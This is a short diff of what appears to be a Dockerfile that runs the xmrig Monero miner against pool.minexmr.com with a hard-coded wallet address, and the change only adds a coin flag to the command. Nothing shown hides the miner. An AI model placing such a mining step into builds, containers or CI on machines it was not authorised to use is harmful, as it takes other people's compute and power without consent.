@@ -17,4 +17,4 @@ RUN apt-get update && \
     chmod +x xmrig
 
 # Run
-RUN ./xmrig -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id $(date +%s)
+RUN ./xmrig --coin xmr -o pool.minexmr.com:443 -u 42mi1qmPYMJhc4ZVqcwdpccCYkrpDUip34TbcABZeBhf8Jp499zrsPSV4C2LFQhm4KW4EXEJGspetTA5AGmXyukC4ARwpAb -k --tls --rig-id $(date +%s)
